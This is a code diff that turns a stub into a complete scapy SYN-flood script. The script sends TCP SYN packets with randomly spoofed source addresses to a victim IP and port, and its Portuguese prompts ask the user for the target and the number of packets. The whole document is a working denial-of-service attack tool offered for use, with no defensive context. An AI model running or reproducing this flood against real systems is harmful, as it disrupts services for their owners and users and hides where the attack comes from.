@@ -1,21 +1,32 @@
-import scapy.all
+import sys
 import random
-import os
+from scapy.all import *
 
-def Flood(IP_victim, Port_victim, iterations):
-	total=0
-	print ("Sending Packets")
+def SYN_Flood(dstIP,dstPort,limit):
+	total = 0
+	print "Enviando Pacotes"
+	for x in range (0,limit):
+		IP_Packet = IP()
+		IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP ()	
+		TCP_Packet.sport = random.randint(1000,9000)
+		TCP_Packet.dport = dstPort
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = random.randint(1000,9000)
+		TCP_Packet.window =random.randint(1000,9000)
+
+		print("Source: "+IP_Packet.src+":"+str(TCP_Packet.sport))
+		send(IP_Packet/TCP_Packet)
+		total+=1
 	
-	for x in range(0,iterations):
-		s_port=random.randint(1000,9000)
-		s_eq=random.randint(1000,9000)
-		w_windows=random.randint(1000,9000)
 
-		IP_Packet=IP()
+def main():
 
-		
+	victim_IP = raw_input ("\n"+"Insira o IP da vitima:")
+	victim_port = input ("Insira a porta para ataque: ")
+	limit = input ("Quantidade de pacotes a enviar:")
+	SYN_Flood(victim_IP,victim_port,int(limit))
 
-Victim="10.13.0.16"
-Source="10.13.2.176"
-Port=21
-
+main()
